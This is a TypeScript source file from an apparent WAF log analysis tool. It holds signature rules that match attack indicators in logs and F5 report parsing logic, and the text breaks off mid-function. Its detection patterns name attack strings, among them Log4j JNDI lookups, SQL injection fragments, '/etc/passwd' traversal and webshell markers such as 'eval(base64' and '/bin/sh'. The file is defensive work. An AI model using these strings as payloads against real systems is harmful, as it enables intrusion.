import * as XLSX from 'xlsx';
import {
  FileInput,
  parseLogs,
} from './socEngine';
import {
  initializeFormatState,
  parseLineToNormalizedLog,
  unpackConcatenatedLines,
  feedSampleLine,
  isDelimitedHeaderLine,
  splitCsvRow,
} from './streamingParser';
import {
  NormalizedLog,
  PolicyComparisonResult,
  PolicySignatureImpact,
  PolicyTechnicalStatus,
  PeriodSummaryMetrics,
  ProtectedServerSummary,
  ProtectedServerThreatDetail,
  PeriodParsingDiagnostic,
  PeriodDataQuality,
  MultiPeriodComparisonResult,
  MultiPeriodEntry,
  MultiPeriodSignatureTrend,
} from '../types';

export interface AttackDetection {
  signatureId: string;
  name: string;
  category: PolicySignatureImpact['category'];
  cveOrRef?: string;
  isMatch: (log: NormalizedLog, rawLine: string) => boolean;
}

export const ATTACK_DETECTIONS: AttackDetection[] = [
  {
    signatureId: 'WAF-060140003',
    name: 'Log4j JNDI Remote Code Execution (RCE)',
    category: 'RCE / Log4j',
    cveOrRef: 'CVE-2021-44228',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${log.user_agent || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('jndi:ldap') ||
        combined.includes('jndi:rmi') ||
        combined.includes('jndi:dns') ||
        combined.includes('${jndi:')
      );
    },
  },
  {
    signatureId: 'OWASP-942-SQLI',
    name: 'SQL Injection (SQLi)',
    category: 'SQLi',
    cveOrRef: 'CWE-89 / OWASP A03',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes("' or '1'='1") ||
        combined.includes('union select') ||
        combined.includes('information_schema') ||
        combined.includes('sleep(') ||
        combined.includes('benchmark(') ||
        combined.includes('waitfor delay') ||
        /sql[-_\s]?injection|sqli/i.test(combined)
      );
    },
  },
  {
    signatureId: 'OWASP-941-XSS',
    name: 'Cross-Site Scripting (XSS)',
    category: 'XSS',
    cveOrRef: 'CWE-79 / OWASP A03',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('<script') ||
        combined.includes('%3cscript') ||
        combined.includes('javascript:') ||
        combined.includes('onerror=') ||
        combined.includes('onload=') ||
        combined.includes('alert(') ||
        /xss|cross[-_\s]?site[-_\s]?scripting/i.test(combined)
      );
    },
  },
  {
    signatureId: 'OWASP-930-TRAVERSAL',
    name: 'Directory / Path Traversal & LFI',
    category: 'Path Traversal',
    cveOrRef: 'CWE-22 / OWASP A01',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('../') ||
        combined.includes('..%2f') ||
        combined.includes('/etc/passwd') ||
        combined.includes('win.ini') ||
        combined.includes('boot.ini') ||
        /path[-_\s]?traversal|rfi[-_\s]?injection|lfi/i.test(combined)
      );
    },
  },
  {
    signatureId: 'WAF-WEBSHELL-CMD',
    name: 'Web Shell Execution & OS Command Injection',
    category: 'Webshell',
    cveOrRef: 'CWE-78 / T1505.003',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('whoami') ||
        combined.includes('cmd.exe') ||
        combined.includes('powershell') ||
        combined.includes('/bin/sh') ||
        combined.includes('shell.php') ||
        combined.includes('cmd.aspx') ||
        combined.includes('passthru(') ||
        combined.includes('eval(base64') ||
        /webshell/i.test(combined)
      );
    },
  },
  {
    signatureId: 'AUTH-BRUTE-SPRAY',
    name: 'Brute Force & Parola Denemesi',
    category: 'Brute Force',
    cveOrRef: 'T1110 / OWASP A07',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      const isAuthPath =
        combined.includes('/login') ||
        combined.includes('/auth') ||
        combined.includes('/owa') ||
        combined.includes('4625');
      const isFail =
        (log.status_code && [401, 403, 429].includes(log.status_code)) ||
        combined.includes('failed') ||
        combined.includes('0xc000006a');
      return (isAuthPath && isFail) || /brute[-_\s]?force|password[-_\s]?spray/i.test(combined);
    },
  },
  {
    signatureId: 'BOT-SCANNER-RECON',
    name: 'Otomatize Güvenlik Tarayıcısı & Fuzzing Botları',
    category: 'Bot / Scanner',
    cveOrRef: 'T1595.002',
    isMatch: (log, raw) => {
      const combined = `${log.user_agent || ''} ${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('nikto') ||
        combined.includes('sqlmap') ||
        combined.includes('acunetix') ||
        combined.includes('nmap') ||
        combined.includes('gobuster') ||
        combined.includes('dirbuster') ||
        combined.includes('nuclei') ||
        combined.includes('burpsuite') ||
        combined.includes('masscan') ||
        combined.includes('nessus') ||
        /vulnerability[-_\s]?scanner|recon[-_\s]?bot/i.test(combined)
      );
    },
  },
  {
    signatureId: 'SENSITIVE-ADMIN-ACCESS',
    name: 'Hassas Dosya ve Yönetim Paneli Araması',
    category: 'Sensitive Access',
    cveOrRef: 'OWASP A05',
    isMatch: (log, raw) => {
      const combined = `${log.islem_komutu || ''} ${raw}`.toLowerCase();
      return (
        combined.includes('/.env') ||
        combined.includes('/.git') ||
        combined.includes('/wp-admin') ||
        combined.includes('/phpmyadmin') ||
        combined.includes('/actuator') ||
        combined.includes('/swagger') ||
        combined.includes('/api-docs') ||
        combined.includes('/backup')
      );
    },
  },
];

export interface ThreatIdentity {
  signatureId: string;
  name: string;
  category: PolicySignatureImpact['category'];
  cveOrRef?: string;
}

export type NormalizedAction = 'BLOCK' | 'ALERT' | 'ALLOW' | 'UNKNOWN';

export function mapCategoryFromThreat(text: string): PolicySignatureImpact['category'] {
  const t = (text || '').toLowerCase();
  if (t.includes('sql')) return 'SQLi';
  if (t.includes('xss') || t.includes('cross site') || t.includes('script')) return 'XSS';
  if (t.includes('command') || t.includes('rce') || t.includes('exec') || t.includes('log4j')) return 'RCE / Log4j';
  if (t.includes('traversal') || t.includes('path') || t.includes('file')) return 'Path Traversal';
  if (t.includes('shell')) return 'Webshell';
  if (t.includes('brute') || t.includes('login') || t.includes('auth')) return 'Brute Force';
  if (t.includes('bot') || t.includes('scan') || t.includes('crawl')) return 'Bot / Scanner';
  if (t.includes('admin') || t.includes('sensitiv') || t.includes('disclosure')) return 'Sensitive Access';
  return 'Özel Kural';
}

export function extractPolicyFromLog(log: NormalizedLog, raw: string): string | null {
  if (log.policy_name && log.policy_name.trim()) {
    return log.policy_name.trim();
  }
  const match = raw.match(
    /\b(?:policy[-_]?name|policy[-_]?id|policy|waf[-_]?policy|sec[-_]?policy)=["']?([^"\s,;]+)/i
  );
  if (match && match[1]) {
    return match[1].trim();
  }
  return null;
}

export function extractServerFromLog(log: NormalizedLog, raw: string): string | null {
  if (
    log.sunucu_ismi &&
    log.sunucu_ismi !== 'Web-Sunucu' &&
    log.sunucu_ismi !== 'Hedef-Sunucu' &&
    log.sunucu_ismi !== '-' &&
    !log.sunucu_ismi.startsWith('10.')
  ) {
    return log.sunucu_ismi;
  }
  const hostMatch = raw.match(
    /\b(?:host|server|server_pool_name|hostname|destination_host|dst_host|destination)=["']?([^"\s,;:]+)/i
  );
  if (hostMatch && hostMatch[1]) {
    return hostMatch[1].trim();
  }
  if (log.hedef_ip && log.hedef_ip !== 'Web-Sunucu' && log.hedef_ip !== 'Hedef-Sunucu') return log.hedef_ip;
  if (log.sunucu_ismi && log.sunucu_ismi !== 'Web-Sunucu' && log.sunucu_ismi !== 'Hedef-Sunucu') return log.sunucu_ismi;
  return null;
}

export function extractRealBytes(log: NormalizedLog, raw: string): number | null {
  if (log.byte_degeri !== null && log.byte_degeri !== undefined && log.byte_degeri > 0) {
    return log.byte_degeri;
  }
  if (log.istemci_byte !== null && log.istemci_byte !== undefined && log.istemci_byte > 0) {
    return log.istemci_byte;
  }
  const byteMatch = raw.match(/\b(?:bytes?|sent_bytes?|rcvd_bytes?|content_length)=["']?(\d+)/i);
  if (byteMatch && byteMatch[1]) {
    const b = parseInt(byteMatch[1], 10);
    if (!isNaN(b) && b > 0) return b;
  }
  return null;
}

export function normalizeActionFromLog(log: NormalizedLog, raw: string): NormalizedAction {
  // Check explicit action in raw log line or key-value (never treat HTTP response code as action)
  const actionMatch = raw.match(
    /\b(?:action|act|device_action|waf_action|policy_action|request_action|enforcement_action|disposition|karar|aksiyon)=["']?([^"\s,;]+)/i
  );
  if (actionMatch && actionMatch[1]) {
    const act = actionMatch[1].toLowerCase().trim();
    if (
      ['block', 'deny', 'drop', 'reject', 'reset', 'close', 'prevent', 'blocked', 'engellendi'].some((k) =>
        act.includes(k)
      )
    ) {
      return 'BLOCK';
    }
    if (
      [
        'alert',
        'alarm',
        'alarmed',
        'detect',
        'warn',
        'warning',
        'log',
        'logged',
        'monitor',
        'learning',
        'simulate',
        'notice',
        'uyari',
      ].some((k) => act.includes(k))
    ) {
      return 'ALERT';
    }
    if (
      ['allow', 'pass', 'permit', 'accept', 'allowed', 'legal', 'izin'].some((k) =>
        act.includes(k)
      )
    ) {
      return 'ALLOW';
    }
    if (['unknown', 'empty', 'undefined', 'none', '-'].includes(act)) {
      return 'UNKNOWN';
    }
  }

  // If raw contains explicit action="unknown", do not infer from HTTP status code
  if (/\baction=["']?unknown["']?/i.test(raw)) {
    return 'UNKNOWN';
  }

  // Only consider baglanti_karari if explicit action wasn't absent/unknown
  if (log.baglanti_karari === 'DENY') {
    return 'BLOCK';
  }
  if (log.baglanti_karari === 'ACCEPT') {
    if (/\b(?:alert|alarm|alarmed|warning|monitor|learning|uyari)\b/i.test(raw)) {
      return 'ALERT';
    }
    if (/\b(?:allow|passed|permit|accept|izin)\b/i.test(raw)) {
      return 'ALLOW';
    }
  }

  return 'UNKNOWN';
}

export function identifyThreatsInLog(log: NormalizedLog, raw: string): ThreatIdentity[] {
  // If log already has structured threat_type (e.g. from F5 custom Excel/CSV schema)
  if (log.threat_type && log.threat_type.trim()) {
    const threatName = log.threat_type.trim();
    const eventName =
      log.islem_komutu &&
      log.islem_komutu !== threatName &&
      !log.islem_komutu.startsWith('http') &&
      log.islem_komutu !== 'REQ'
        ? log.islem_komutu.trim()
        : '';
    const fullName = eventName ? `${threatName} (${eventName})` : threatName;
    const cat = mapCategoryFromThreat(threatName);
    return [
      {
        signatureId: threatName,
        name: fullName,
        category: cat,
      },
    ];
  }

  // 1. Explicit rule_id or signature_id check (highest priority: authoritative device stamps)
  const ruleMatch = raw.match(
    /\b(?:rule[-_]?id|rule|rule[-_]?name|signature[-_]?id|signature|sig[-_]?id|threat[-_]?id)=["']?([^"\s,;]+)/i
  );
  const attackMatch = raw.match(
    /\b(?:attack[-_]?type|attack|threat[-_]?name|threat|violation|policy_rule)=["']?([^"';]+)/i
  );

  if (ruleMatch && ruleMatch[1]) {
    const rKey = ruleMatch[1].trim();
    const knownDet = ATTACK_DETECTIONS.find((d) => d.signatureId.toLowerCase() === rKey.toLowerCase());
    if (knownDet) {
      return [
        {
          signatureId: knownDet.signatureId,
          name: attackMatch ? attackMatch[1].trim() : knownDet.name,
          category: knownDet.category,
          cveOrRef: knownDet.cveOrRef,
        },
      ];
    }
    return [
      {
        signatureId: rKey,
        name: attackMatch ? attackMatch[1].trim() : `Kural: ${rKey}`,
        category: (attackMatch ? mapCategoryFromThreat(attackMatch[1]) : 'Özel Kural') as any,
      },
    ];
  }

  const matches: ThreatIdentity[] = [];

  // 2. Predefined ATTACK_DETECTIONS
  for (const det of ATTACK_DETECTIONS) {
    if (det.isMatch(log, raw)) {
      matches.push({
        signatureId: det.signatureId,
        name: det.name,
        category: det.category,
        cveOrRef: det.cveOrRef,
      });
    }
  }

  // 3. Attack attribute fallback or specific regex tokens
  if (attackMatch && attackMatch[1] && matches.length === 0) {
    const atk = attackMatch[1].trim();
    matches.push({
      signatureId: atk,
      name: atk,
      category: mapCategoryFromThreat(atk),
    });
  } else if (matches.length === 0) {
    const ruleTokenMatch = raw.match(/\b(rule-\d+|sig-\d+|cve-\d+-\d+)\b/i);
    if (ruleTokenMatch) {
      matches.push({
        signatureId: ruleTokenMatch[1],
        name: `Kural: ${ruleTokenMatch[1]}`,
        category: 'Özel Kural',
      });
    } else if (/\bsqli\b/i.test(raw)) {
      matches.push({
        signatureId: 'OWASP-942-SQLI',
        name: 'SQL Injection',
        category: 'SQLi',
      });
    } else if (/\bxss\b/i.test(raw)) {
      matches.push({
        signatureId: 'OWASP-941-XSS',
        name: 'Cross-Site Scripting (XSS)',
        category: 'XSS',
      });
    }
  }

  return matches;
}

export interface InternalParsedPeriod {
  logs: NormalizedLog[];
  rawLines: string[];
  metrics: PeriodSummaryMetrics;
  diagnostics: PeriodParsingDiagnostic[];
  actionDataAvailable: boolean;
  responseDistribution: Record<string, number>;
  dataQuality: PeriodDataQuality;
}

export const EXPECTED_F5_COLUMNS = [
  'Policy Name (custom)',
  'Threat Type (custom)',
  'Event Name',
  'Log Source',
  'Response',
  'Destination',
  'Destination Port',
  'Start Time',
  'Low Level',
  'Count',
];

export function normalizeHeaderKey(raw: string): string {
  if (!raw) return '';
  return raw
    .replace(/[\uFEFF\u200B\u200C\u200D\u00A0]/g, ' ')
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '_')
    .replace(/^_+|_+$/g, '');
}

export function parseCountValue(val: unknown): number | null {
  if (val === null || val === undefined) return null;
  if (typeof val === 'number') {
    if (isNaN(val) || val < 0) return null;
    return Math.round(val);
  }
  const str = String(val)
    .replace(/[\uFEFF\u200B\u200C\u200D\u00A0]/g, ' ')
    .trim();
  if (!str) return null;
  const unquoted = str.replace(/^["']|["']$/g, '').trim();
  if (unquoted === '0') return 0;
  // Strip out non-numeric characters (commas in "4,092", periods in "1.250", spaces)
  const cleaned = unquoted.replace(/[^0-9]/g, '');
  if (!cleaned) return null;
  const parsed = parseInt(cleaned, 10);
  return isNaN(parsed) || parsed < 0 ? null : parsed;
}

export interface DetectedF5Table {
  delimiter: string;
  rawHeaders: string[];
  headerRowIndex: number;
  policyIdx: number;
  threatTypeIdx: number;
  eventNameIdx: number;
  logSourceIdx: number;
  responseIdx: number;
  destinationIdx: number;
  destPortIdx: number;
  startTimeIdx: number;
  lowLevelIdx: number;
  countIdx: number;
  actionIdx?: number;
  clientIpIdx?: number;
  uriIdx?: number;
  bytesIdx?: number;
  hasExplicitActionColumn: boolean;
  isNumericResponseOnly: boolean;
}

export function detectF5Table(lines: string[]): DetectedF5Table | null {
  const delimiters = [',', ';', '\t', '|'];
  for (let i = 0; i < Math.min(lines.length, 30); i++) {
    const line = lines[i].trim();
    if (!line || line.startsWith('#')) continue;
    for (const d of delimiters) {
      if (!line.includes(d)) continue;
      const rawParts = splitCsvRow(line, d);
      if (rawParts.length < 3) continue;

      const parts = rawParts.map((s) => normalizeHeaderKey(s));

      const policyIdx = parts.findIndex(
        (p) => p.includes('policy') || p.includes('politika') || p.includes('kural')
      );
      const threatTypeIdx = parts.findIndex(
        (p) =>
          p.includes('threat') ||
          p.includes('attack_type') ||
          p.includes('attack') ||
          p.includes('tehdit') ||
          p.includes('saldiri')
      );
      const eventNameIdx = parts.findIndex(
        (p) =>
          p.includes('event') ||
          p.includes('violation') ||
          p.includes('olay') ||
          p.includes('ihlal')
      );
      const logSourceIdx = parts.findIndex(
        (p) =>
          p.includes('log_source') ||
          p.includes('logsource') ||
          p.includes('log_src') ||
          p.includes('device') ||
          p.includes('kaynak') ||
          (p.includes('source') && !p.includes('ip'))
      );
      const actionIdx = parts.findIndex(
        (p) =>
          p === 'action' ||
          p === 'device_action' ||
          p === 'waf_action' ||
          p === 'policy_action' ||
          p === 'request_action' ||
          p === 'enforcement_action' ||
          p === 'disposition' ||
          p === 'karar' ||
          p === 'aksiyon'
      );
      const responseIdx = parts.findIndex(
        (p) =>
          p === 'response' ||
          p === 'http_response' ||
          p === 'http_status' ||
          p === 'status' ||
          p === 'status_code' ||
          p === 'yanit' ||
          p === 'cevap' ||
          (p === 'action' && actionIdx === -1)
      );
      const destinationIdx = parts.findIndex(
        (p) =>
          p === 'destination' ||
          p === 'dest' ||
          p === 'server' ||
          p === 'target' ||
          p === 'host' ||
          p === 'hedef' ||
          p === 'sunucu'
      );
      const destPortIdx = parts.findIndex(
        (p) =>
          p.includes('destination_port') ||
          p.includes('dest_port') ||
          p.includes('destport') ||
          p === 'port' ||
          p === 'dst_port' ||
          p.includes('hedef_port')
      );
      const startTimeIdx = parts.findIndex(
        (p) =>
          p.includes('start_time') ||
          p.includes('starttime') ||
          p.includes('timestamp') ||
          p === 'time' ||
          p === 'date' ||
          p.includes('tarih') ||
          p.includes('zaman') ||
          p.includes('baslangic')
      );
      const lowLevelIdx = parts.findIndex(
        (p) =>
          p.includes('low_level') ||
          p.includes('lowlevel') ||
          p.includes('severity') ||
          p === 'level' ||
          p.includes('seviye')
      );
      const countIdx = parts.findIndex(
        (p) =>
          p === 'count' ||
          p === 'cnt' ||
          p === 'total' ||
          p === 'adet' ||
          p === 'sayi' ||
          p === 'toplam' ||
          p === 'occurrence' ||
          p === 'occurrences'
      );
      const clientIpIdx = parts.findIndex(
        (p) =>
          p.includes('client_ip') ||
          p.includes('source_ip') ||
          p === 'src_ip' ||
          p === 'source' ||
          p === 'client' ||
          p.includes('istemci')
      );
      const uriIdx = parts.findIndex(
        (p) =>
          p.includes('uri') ||
          p.includes('url') ||
          p.includes('path') ||
          p.includes('query')
      );
      const bytesIdx = parts.findIndex(
        (p) =>
          p.includes('byte') ||
          p.includes('size') ||
          p.includes('content_length') ||
          p.includes('payload_size')
      );

      const coreMatches = [policyIdx, threatTypeIdx, responseIdx, destinationIdx, eventNameIdx, countIdx].filter(
        (idx) => idx !== -1
      ).length;

      if (coreMatches >= 2 || (threatTypeIdx !== -1 && (responseIdx !== -1 || destinationIdx !== -1))) {
        // Disambiguate whether Response column contains numeric HTTP codes or explicit action words
        let hasExplicitAction = actionIdx !== -1;
        let isNumericResponseOnly = true;

        if (responseIdx !== -1) {
          let sampledCount = 0;
          for (let sampleR = i + 1; sampleR < Math.min(lines.length, i + 25); sampleR++) {
            const sLine = lines[sampleR].trim();
            if (!sLine || sLine.startsWith('#')) continue;
            const sCells = splitCsvRow(sLine, d);
            const rVal = (sCells[responseIdx] || '').trim();
            if (!rVal) continue;
            sampledCount++;
            if (isNaN(Number(rVal))) {
              isNumericResponseOnly = false;
              if (
                ['block', 'alarm', 'alert', 'drop', 'deny', 'allow', 'pass', 'reject', 'reset'].some((k) =>
                  rVal.toLowerCase().includes(k)
                )
              ) {
                hasExplicitAction = true;
              }
            }
          }
          if (sampledCount === 0) {
            isNumericResponseOnly = false;
          }
        } else {
          isNumericResponseOnly = false;
        }

        return {
          delimiter: d,
          rawHeaders: rawParts,
          headerRowIndex: i,
          policyIdx,
          threatTypeIdx,
          eventNameIdx,
          logSourceIdx,
          responseIdx,
          destinationIdx,
          destPortIdx,
          startTimeIdx,
          lowLevelIdx,
          countIdx,
          actionIdx: actionIdx !== -1 ? actionIdx : undefined,
          clientIpIdx: clientIpIdx !== -1 ? clientIpIdx : undefined,
          uriIdx: uriIdx !== -1 ? uriIdx : undefined,
          bytesIdx: bytesIdx !== -1 ? bytesIdx : undefined,
          hasExplicitActionColumn: hasExplicitAction,
          isNumericResponseOnly,
        };
      }
    }
  }
  return null;
}

export function parsePeriodContent(
  files: FileInput[],
  label: string,
  forceAction?: 'ALERT' | 'BLOCK'
): InternalParsedPeriod {
  parseLogs(files, {
    exfiltrationBytes: 10 * 1024 * 1024,
    failedAttempts: 5,
    detectionProfile: 'BALANCED',
  });

  const allLogs: NormalizedLog[] = [];
  const rawLines: string[] = [];
  const diagnostics: PeriodParsingDiagnostic[] = [];

  for (const file of files) {
    const lines = file.content.split(/\r?\n/);
    const tableInfo = detectF5Table(lines);
    let parsedCountForFile = 0;

    if (tableInfo) {
      // F5 / Tabular WAF Schema
      const unmatched: string[] = [];
      const expectedColumnDefinitions = [
        { name: 'Policy Name (custom)', key: 'policy', idx: tableInfo.policyIdx },
        { name: 'Threat Type (custom)', key: 'threat', idx: tableInfo.threatTypeIdx },
        { name: 'Event Name', key: 'event', idx: tableInfo.eventNameIdx },
        { name: 'Log Source', key: 'logSource', idx: tableInfo.logSourceIdx },
        { name: 'Response', key: 'response', idx: tableInfo.responseIdx },
        { name: 'Destination', key: 'destination', idx: tableInfo.destinationIdx },
        { name: 'Destination Port', key: 'destinationPort', idx: tableInfo.destPortIdx },
        { name: 'Start Time', key: 'startTime', idx: tableInfo.startTimeIdx },
        { name: 'Low Level', key: 'lowLevel', idx: tableInfo.lowLevelIdx },
        { name: 'Count', key: 'count', idx: tableInfo.countIdx },
      ];

      for (const col of expectedColumnDefinitions) {
        if (col.idx === -1) unmatched.push(col.name);
      }

      const columnStatusList = expectedColumnDefinitions.map((col) => ({
        name: col.name,
        canonicalKey: col.key,
        present: col.idx !== -1,
        rawHeaderName: col.idx !== -1 ? tableInfo.rawHeaders[col.idx] : undefined,
      }));

      if (tableInfo.actionIdx !== undefined && tableInfo.actionIdx !== -1) {
        columnStatusList.push({
          name: 'Action (Opsiyonel)',
          canonicalKey: 'action',
          present: true,
          rawHeaderName: tableInfo.rawHeaders[tableInfo.actionIdx],
        });
      }

      const isXlsx = file.name.toLowerCase().endsWith('.xlsx') || file.name.toLowerCase().endsWith('.xls');

      const diag: PeriodParsingDiagnostic = {
        fileName: file.name,
        fileType: isXlsx ? 'XLSX' : 'CSV/LOG',
        sheetName: (file as any).sheetName || 'Sheet1',
        headerFound: true,
        totalLines: lines.filter((l) => l.trim().length > 0).length,
        parsedRowsCount: 0,
        rejectedRowsCount: 0,
        rejectionReasons: [],
        normalizedRecordsCount: 0,
        aggregateObservationCount: 0,
        detectedFormat: 'F5_AGGREGATED_REPORT',
        detectedColumns: tableInfo.rawHeaders,
        isF5SchemaDetected: true,
        actionDataAvailable: tableInfo.hasExplicitActionColumn || Boolean(forceAction),
        columnStatusList,
        columnMapping: {
          policyCol: tableInfo.policyIdx !== -1 ? tableInfo.rawHeaders[tableInfo.policyIdx] : null,
          threatCol: tableInfo.threatTypeIdx !== -1 ? tableInfo.rawHeaders[tableInfo.threatTypeIdx] : null,
          eventCol: tableInfo.eventNameIdx !== -1 ? tableInfo.rawHeaders[tableInfo.eventNameIdx] : null,
          logSourceCol: tableInfo.logSourceIdx !== -1 ? tableInfo.rawHeaders[tableInfo.logSourceIdx] : null,
          responseCol: tableInfo.responseIdx !== -1 ? tableInfo.rawHeaders[tableInfo.responseIdx] : null,
          destinationCol: tableInfo.destinationIdx !== -1 ? tableInfo.rawHeaders[tableInfo.destinationIdx] : null,
          portCol: tableInfo.destPortIdx !== -1 ? tableInfo.rawHeaders[tableInfo.destPortIdx] : null,
          timeCol: tableInfo.startTimeIdx !== -1 ? tableInfo.rawHeaders[tableInfo.startTimeIdx] : null,
          lowLevelCol: tableInfo.lowLevelIdx !== -1 ? tableInfo.rawHeaders[tableInfo.lowLevelIdx] : null,
          countCol: tableInfo.countIdx !== -1 ? tableInfo.rawHeaders[tableInfo.countIdx] : null,
          actionCol: tableInfo.actionIdx !== undefined && tableInfo.actionIdx !== -1 ? tableInfo.rawHeaders[tableInfo.actionIdx] : null,
          bytesCol: tableInfo.bytesIdx !== undefined && tableInfo.bytesIdx !== -1 ? tableInfo.rawHeaders[tableInfo.bytesIdx] : null,
        },
        unmatchedExpectedColumns: unmatched,
        warningOrError: null,
      };

      for (let r = tableInfo.headerRowIndex + 1; r < lines.length; r++) {
        const line = lines[r].trim();
        if (!line || line.startsWith('#')) continue;
        const cells = splitCsvRow(line, tableInfo.delimiter);
        if (cells.length < 2 || cells.every((c) => !c || c.trim() === '')) {
          diag.rejectedRowsCount = (diag.rejectedRowsCount || 0) + 1;
          diag.rejectionReasons = diag.rejectionReasons || [];
          if (diag.rejectionReasons.length < 5) {
            diag.rejectionReasons.push(`Satır ${r + 1}: Yetersiz veya boş hücre`);
          }
          continue;
        }

        const policyName =
          tableInfo.policyIdx !== -1 && cells[tableInfo.policyIdx]?.trim()
            ? cells[tableInfo.policyIdx].trim()
            : null;
        const threatType =
          tableInfo.threatTypeIdx !== -1 && cells[tableInfo.threatTypeIdx]?.trim()
            ? cells[tableInfo.threatTypeIdx].trim()
            : null;
        const eventName =
          tableInfo.eventNameIdx !== -1 && cells[tableInfo.eventNameIdx]?.trim()
            ? cells[tableInfo.eventNameIdx].trim()
            : null;
        const logSource =
          tableInfo.logSourceIdx !== -1 && cells[tableInfo.logSourceIdx]?.trim()
            ? cells[tableInfo.logSourceIdx].trim()
            : null;
        const responseRaw =
          tableInfo.responseIdx !== -1 && cells[tableInfo.responseIdx]?.trim()
            ? cells[tableInfo.responseIdx].trim()
            : null;
        const destination =
          tableInfo.destinationIdx !== -1 && cells[tableInfo.destinationIdx]?.trim()
            ? cells[tableInfo.destinationIdx].trim()
            : null;
        const clientIp =
          tableInfo.clientIpIdx !== undefined &&
          tableInfo.clientIpIdx !== -1 &&
          cells[tableInfo.clientIpIdx]?.trim()
            ? cells[tableInfo.clientIpIdx].trim()
            : null;
        const uriVal =
          tableInfo.uriIdx !== undefined &&
          tableInfo.uriIdx !== -1 &&
          cells[tableInfo.uriIdx]?.trim()
            ? cells[tableInfo.uriIdx].trim()
            : null;
        let rowBytes: number | null = null;
        if (tableInfo.bytesIdx !== undefined && tableInfo.bytesIdx !== -1 && cells[tableInfo.bytesIdx]?.trim()) {
          const rawB = parseInt(cells[tableInfo.bytesIdx].replace(/[^0-9]/g, ''), 10);
          if (!isNaN(rawB)) {
            rowBytes = rawB;
          }
        }
        let port: number | null = null;
        if (tableInfo.destPortIdx !== -1 && cells[tableInfo.destPortIdx]?.trim()) {
          const rawP = parseInt(cells[tableInfo.destPortIdx].replace(/[^0-9]/g, ''), 10);
          if (!isNaN(rawP) && rawP > 0) {
            port = rawP;
          }
        }
        const startTime =
          tableInfo.startTimeIdx !== -1 ? cells[tableInfo.startTimeIdx]?.trim() || null : null;
        const rawCount =
          tableInfo.countIdx !== -1 ? parseCountValue(cells[tableInfo.countIdx]) : null;
        const count = rawCount;
        const weight = rawCount !== null ? rawCount : (tableInfo.countIdx !== -1 ? 0 : 1);

        // Action normalization (strictly decoupled from HTTP status codes)
        let actionStr = '';
        if (tableInfo.actionIdx !== undefined && tableInfo.actionIdx !== -1) {
          actionStr = (cells[tableInfo.actionIdx] || '').trim().toLowerCase();
        } else if (tableInfo.hasExplicitActionColumn && responseRaw) {
          actionStr = responseRaw.toLowerCase();
        }

        let normAct: NormalizedAction = 'UNKNOWN';
        if (actionStr) {
          if (
            ['blocked', 'block', 'drop', 'dropped', 'reject', 'rejected', 'deny', 'denied', 'reset', 'engellendi'].some(
              (k) => actionStr.includes(k)
            )
          ) {
            normAct = 'BLOCK';
          } else if (
            [
              'alarmed',
              'alarm',
              'alert',
              'alerted',
              'log',
              'logged',
              'notice',
              'learning',
              'monitor',
              'warn',
              'uyari',
            ].some((k) => actionStr.includes(k))
          ) {
            normAct = 'ALERT';
          } else if (
            ['allowed', 'allow', 'passed', 'pass', 'legal', 'permit', 'permitted', 'izin'].some((k) =>
              actionStr.includes(k)
            )
          ) {
            normAct = 'ALLOW';
          }
        } else if (forceAction) {
          normAct = forceAction;
        }

        const threatName = threatType || eventName || null;
        const threatFullName =
          threatType && eventName && threatType !== eventName
            ? `${threatType} (${eventName})`
            : threatName;

        const isNumericStatus = Boolean(responseRaw && !isNaN(Number(responseRaw)));
        const statusCodeNum = isNumericStatus ? parseInt(responseRaw!, 10) : null;

        const parsedLog: NormalizedLog = {
          kaynak_dosya: file.name,
          tarih: startTime,
          tarih_obj: startTime ? new Date(startTime) : null,
          ip_adresi: clientIp,
          hedef_ip: destination,
          hedef_port: port,
          kaynak_port: null,
          sunucu_ismi: destination,
          islem_komutu: uriVal,
          http_method: null,
          user_agent: null,
          byte_degeri: rowBytes,
          istemci_byte: null,
          status_code: statusCodeNum,
          baglanti_karari: normAct === 'BLOCK' ? 'DENY' : normAct === 'ALLOW' ? 'ACCEPT' : 'BILINMIYOR',
          kullanici_adi: null,
          referer: null,
          response_time_ms: null,
          session_cookie: null,
          weight: weight,
          count: rawCount,
          policy_name: policyName,
          threat_type: threatType,
          event_name: eventName,
          log_source: logSource,
          response_code: responseRaw,
        };

        const syntheticRaw = `policy="${policyName || ''}" threat="${threatType || ''}" event="${eventName || ''}" response="${responseRaw || ''}" action="${normAct.toLowerCase()}" host="${destination || ''}" port=${port || ''} count=${count !== null ? count : ''} time="${startTime || ''}"`;

        allLogs.push(parsedLog);
        rawLines.push(syntheticRaw);
        parsedCountForFile++;
        diag.parsedRowsCount++;
        if (rawCount !== null) {
          diag.aggregateObservationCount = (diag.aggregateObservationCount || 0) + rawCount;
        }

        if (!diag.sampleParsedValues) {
          diag.sampleParsedValues = {
            samplePolicy: policyName || 'N/A',
            sampleThreat: threatFullName || 'N/A',
            sampleResponse: responseRaw || (normAct !== 'UNKNOWN' ? normAct : 'N/A'),
            sampleDestination: destination || 'N/A',
            sampleCount: count,
          };
        }
      }

      diag.normalizedRecordsCount = parsedCountForFile;

      if (parsedCountForFile === 0) {
        diag.warningOrError =
          'Excel okundu ancak karşılaştırılabilir kayıt oluşturulamadı. Neden: Dosyada geçerli veri satırı bulunamadı veya tüm satırlar reddedildi.';
      } else if (!tableInfo.hasExplicitActionColumn && tableInfo.isNumericResponseOnly && !forceAction) {
        diag.warningOrError =
          'Bilgi: Excelde "Action" kolonu bulunmamaktadır; "Response" kolonu HTTP durum kodlarını içermektedir. Güvenlik gereği yapay BLOCK üretilmemiş, gözlem hacmi bazlı analiz yapılmıştır.';
      }

      diagnostics.push(diag);
    } else {
      // Standard / Raw Log Format Fallback
      const formatState = initializeFormatState(file.name);
      let sampleVal: PeriodParsingDiagnostic['sampleParsedValues'];

